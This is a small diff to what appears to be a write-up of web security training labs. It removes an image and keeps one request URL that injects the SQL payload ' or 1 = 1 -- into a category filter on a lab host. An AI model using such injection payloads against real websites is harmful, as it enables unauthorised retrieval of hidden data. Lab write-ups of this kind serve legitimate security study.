@@ -6,8 +6,6 @@
 
 ### Lab1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
 
-![sql1.png](sql1.png)
-
 ```http
 https://ac701fd11eeda548806db59400ab002f.web-security-academy.net/filter?category=Gifts' or 1 = 1 --
 ```
